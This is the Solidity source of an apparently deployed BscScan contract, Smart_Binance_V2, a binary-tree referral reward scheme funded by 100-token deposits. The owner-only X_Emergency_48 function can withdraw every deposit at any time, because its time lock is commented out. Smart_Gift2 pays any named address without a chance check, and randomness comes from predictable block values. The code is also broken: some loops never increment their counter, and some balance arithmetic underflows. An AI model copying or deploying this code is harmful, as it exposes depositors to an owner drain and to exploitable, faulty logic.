/**
 *Submitted for verification at BscScan.com on 2023-03-31
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.4.22 <0.9.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal pure virtual returns (bytes calldata) {
        return msg.data;
    }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }
    function functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
                value,
                "Address: low-level call with value failed"
            );
    }
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transfer.selector, to, value)
        );
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.transferFrom.selector, from, to, value)
        );
    }

    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(token.approve.selector, spender, value)
        );
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) +
            (value);
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(
                token.approve.selector,
                spender,
                newAllowance
            )
        );
    }
    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) -
            (value);
        _callOptionalReturn(
            token,
            abi.encodeWithSelector(
                token.approve.selector,
                spender,
                newAllowance
            )
        );
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        bytes memory returndata = address(token).functionCall(
            data,
            "SafeERC20: low-level call failed"
        );
        if (returndata.length > 0) {
            require(
                abi.decode(returndata, (bool)),
                "SafeERC20: ERC20 operation did not succeed"
            );
        }
    }
}
contract Smart_Binance_Base {
    struct Node {
        uint32 id;
        uint32 ALLleftDirect;
        uint32 ALLrightDirect;
        uint24 leftDirect;
        uint24 rightDirect;
        uint8 childs;
        bool leftOrrightUpline;
        address UplineAddress;
        address leftDirectAddress;
        address rightDirectAddress;
    }
    mapping(address => Node) internal _users;
    mapping(uint32 => address) internal _allUsersAddress;
    mapping(uint24 => address) internal _TodayRegisterAddress;
    mapping(uint24 => address) internal _PointTodayAddress;
    mapping(uint24 => address) internal _GiftTodayAddress;
    mapping(uint8 => address) internal _BlackListAddress;
    address internal owner;
    address internal tokenAddress;
    address internal Operator;
    IERC20 internal _depositToken;
    uint32 internal _userId;
    uint24 internal _RegisterId;
    uint24 internal _PointId;
    uint24 internal _GiftId;
    uint256 internal lastRun;
    uint8 internal Lock;
    uint8 internal Count_Last_Users;
    // Smart_Binance internal NBJ;
    string internal Note;
    string internal IPFS;
}

contract Smart_Binance_V2 is Context, Smart_Binance_Base {
    using SafeERC20 for IERC20;
    constructor() {
        owner = _msgSender();
        _depositToken = IERC20(0x1BC1039809d8CBa0d0C8411cB90f58266038D745);
        tokenAddress = 0x4DB1B84d1aFcc9c6917B5d5cF30421a2f2Cab4cf;
        Operator = 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c;
        // NBJ = Smart_Binance(0x5741da6D2937E5896e68B1604E25972a4834C701);
        lastRun = block.timestamp;
    }

    function Register(address uplineAddress) external {
        RegisterBase(uplineAddress);
    }

    function RegisterBase(address uplineAddress) private {
        require(_users[uplineAddress].childs != 2, "Upline Has Two directs!");
        require(
            _msgSender() != uplineAddress,
            "You can not enter your address!"
        );

        require(!isUserExists(_msgSender()), "You Are registered!");
        require(isUserExists(uplineAddress), "Upline is Not Exist!");

        _depositToken.safeTransferFrom(
            _msgSender(),
            address(this),
            100 * 10**18
        );

        _allUsersAddress[_userId] = _msgSender();
        _userId++;
        Node memory user = Node({
            id: _userId,
            ALLleftDirect: 0,
            ALLrightDirect: 0,
            leftDirect: 0,
            rightDirect: 0,
            childs: 0,
            leftOrrightUpline: _users[uplineAddress].childs == 0 ? false : true,
            UplineAddress: uplineAddress,
            leftDirectAddress: address(0),
            rightDirectAddress: address(0)
        });

        _users[_msgSender()] = user;

        _TodayRegisterAddress[_RegisterId] = _msgSender();
        _RegisterId++;

        if (_users[uplineAddress].childs == 0) {
            _users[uplineAddress].leftDirect++;
            _users[uplineAddress].ALLleftDirect++;
            _users[uplineAddress].leftDirectAddress = _msgSender();
        } else {
            _users[uplineAddress].rightDirect++;
            _users[uplineAddress].ALLrightDirect++;
            _users[uplineAddress].rightDirectAddress = _msgSender();
        }
        _users[uplineAddress].childs++;
        IERC20(tokenAddress).transfer(_msgSender(), 100 * 10**18);
    }

    function Reward_12() external {
        RewardBase();
    }

    function RewardBase() private {
        require(Lock == 0, "Proccesing");
        // require(
        //     block.timestamp > lastRun + 12 hours,
        //     "The Reward_12 Time Has Not Come"
        // );

        Broadcast_Point();
        require(Total_Point() > 0, "Total Point Is Zero!");

        Lock = 1;
        uint256 PriceValue = Value_Point();
        uint256 ClickReward = Reward_Click() * 10**18;

        for (uint16 i = 0; i < _PointId; i++) {
            Node memory TempNode = _users[_PointTodayAddress[i]];
            uint24 Result = Today_User_Point(_PointTodayAddress[i]);

            if (TempNode.leftDirect == Result) {
                TempNode.leftDirect = 0;
                TempNode.rightDirect -= Result;
            } else if (TempNode.rightDirect == Result) {
                TempNode.leftDirect -= Result;
                TempNode.rightDirect = 0;
            } else {
                if (TempNode.leftDirect < TempNode.rightDirect) {
                    TempNode.leftDirect = 0;
                    TempNode.rightDirect -= TempNode.leftDirect;
                } else {
                    TempNode.rightDirect = 0;
                    TempNode.rightDirect -= TempNode.leftDirect;
                }
            }

            _users[_PointTodayAddress[i]] = TempNode;

            if (Result * PriceValue > _depositToken.balanceOf(address(this))) {
                _depositToken.safeTransfer(
                    _PointTodayAddress[i],
                    _depositToken.balanceOf(address(this))
                );
            } else {
                _depositToken.safeTransfer(
                    _PointTodayAddress[i],
                    Result * PriceValue
                );
            }
        }
        if (ClickReward <= _depositToken.balanceOf(address(this))) {
            _depositToken.safeTransfer(_msgSender(), ClickReward);
        }
        lastRun = block.timestamp;
        _RegisterId = 0;
        _PointId = 0;
        _GiftId = 0;
        Lock = 0;
    }

    function Broadcast_Point() private {
        address uplineNode;
        address childNode;
        for (uint16 k = 0; k < _RegisterId; k++) {
            uplineNode = _users[_users[_TodayRegisterAddress[k]].UplineAddress]
                .UplineAddress;
            childNode = _users[_TodayRegisterAddress[k]].UplineAddress;
            if (isUserPointExists(childNode) == true) {
                _PointTodayAddress[_PointId] = childNode;
                _PointId++;
            }
            while (uplineNode != address(0)) {
                if (_users[childNode].leftOrrightUpline == false) {
                    _users[uplineNode].leftDirect++;
                    _users[uplineNode].ALLleftDirect++;
                } else {
                    _users[uplineNode].rightDirect++;
                    _users[uplineNode].ALLrightDirect++;
                }
                if (isUserPointExists(uplineNode) == true) {
                    _PointTodayAddress[_PointId] = uplineNode;
                    _PointId++;
                }
                childNode = uplineNode;
                uplineNode = _users[uplineNode].UplineAddress;
            }
        }
    }

    function Smart_Gift(uint8 ChanceNumber) external {
        require(Lock == 0, "Proccesing");
        require(
            ChanceNumber < 4 && ChanceNumber > 0,
            "Number is Incorrect Please Choice 1,2,3!"
        );
        require(isUserExists(_msgSender()), "User is Not Exist!");
        require(User_Point(_msgSender()) < 1, "Just All_Time 0 Point!");
        require(SmartGift_Balance() > 0, "Smart_Gift Balance Is Zero!");
        require(isUserGiftExists(_msgSender()), "You Did Smart_Gift Today!");

        _GiftTodayAddress[_GiftId] = _msgSender();
        _GiftId++;
        if (ChanceNumber == random(2)) {
            _depositToken.safeTransfer(_msgSender(), 10 * 10**18);
        } 
    }
    function Smart_Gift2(uint8 ChanceNumber, address User) external {
        require(Lock == 0, "Proccesing");
        require(
            ChanceNumber < 4 && ChanceNumber > 0,
            "Number is Incorrect Please Choice 1,2,3!"
        );
        require(isUserExists(User), "User is Not Exist!");
        require(User_Point(User) < 1, "Just All_Time 0 Point!");
        require(SmartGift_Balance() > 0, "Smart_Gift Balance Is Zero!");
        require(isUserGiftExists(User), "You Did Smart_Gift Today!");

        _GiftTodayAddress[_GiftId] = User;
        _GiftId++;
        _depositToken.safeTransfer(User, 10 * 10**18);
        
    }

   
    function unsafe_inc(uint24 x) private pure returns (uint24) {
        unchecked {
            return x + 1;
        }
    }

    function X_Emergency_48() external {
        require(_msgSender() == owner, "Just Owner!");
        // require(
        //     block.timestamp > lastRun + 48 hours,
        //     "The X_Emergency_72 Time Has Not Come"
        // );
        _depositToken.safeTransfer(
            owner,
            _depositToken.balanceOf(address(this))
        );
    }
    function isUserExists(address user) private view returns (bool) {
        return (_users[user].id != 0);
    }

    function isUserPointExists(address user) private view returns (bool) {
        if (Today_User_Point(user) > 0) {
            for (uint16 i = 0; i < _PointId; i++) {
                if (_PointTodayAddress[i] == user) {
                    return false;
                }
            }
            return true;
        } else {
            return false;
        }
    }

    function isUserGiftExists(address user) private view returns (bool) {
        for (uint24 i = 0; i < _GiftId; unsafe_inc(i)) {
            if (_GiftTodayAddress[i] == user) {
                return false;
            }
        }
        return true;
    }
    function Today_User_Point(address Add_Address)
        private
        view
        returns (uint24)
    {
        uint24 min = _users[Add_Address].leftDirect <=
            _users[Add_Address].rightDirect
            ? _users[Add_Address].leftDirect
            : _users[Add_Address].rightDirect;
        if (min > 11) {
            //maxPoint = 25
            return 11;
        } else {
            return min;
        }
    }
    function isUserBlackListExists(address user) private view returns (bool) {
        for (uint8 i = 0; i < Count_Last_Users; unsafe_inc(uint8(i))) {
            if (_BlackListAddress[i] == user) {
                return false;
            }
        }
        return true;
    }
    function User_Point(address Add_Address) private view returns (uint32) {
        return
            _users[Add_Address].ALLleftDirect <=
                _users[Add_Address].ALLrightDirect
                ? _users[Add_Address].ALLleftDirect
                : _users[Add_Address].ALLrightDirect;
    }

    function Today_Contract_Balance() public view returns (uint256) {
        return _depositToken.balanceOf(address(this)) / 10**18;
    }

    function Today_Number_Register() public view returns (uint24) {
        return _RegisterId;
    }

    function Reward_Price() private view returns (uint256) {
        return
            (_depositToken.balanceOf(address(this)) -
                (Today_Number_Register() * 10**18)) / 10**18;
    }

    function Value_Point() private view returns (uint256) {
        return (Reward_Price() * 10**18) / Total_Point();
    }

    function Reward_Click() public view returns (uint256) {
        return Today_Number_Register();
    }

    function Total_Point() private view returns (uint24) {
        uint24 TPoint;
        for (uint24 i = 0; i <= _userId; i = unsafe_inc(i)) {
            uint24 min = _users[_allUsersAddress[i]].leftDirect <=
                _users[_allUsersAddress[i]].rightDirect
                ? _users[_allUsersAddress[i]].leftDirect
                : _users[_allUsersAddress[i]].rightDirect;

            if (min > 11) {
                min = 11;
            }
            TPoint += min;
        }
        return TPoint;
    }

    function random(uint256 number) private view returns (uint256) {
        return
            (uint256(
                keccak256(
                    abi.encodePacked(
                        block.timestamp,
                        block.prevrandao,
                        msg.sender
                    )
                )
            ) % number) + 1;
    }

    function SmartGift_Balance() public view returns (uint256) {
        return (Today_Contract_Balance() - (Today_Number_Register() * 90));
    }

    function Today_Winners() public view returns (uint256) {
        return (((Today_Number_Register() * 100) -
            (Today_Contract_Balance())) / 10);
    }


}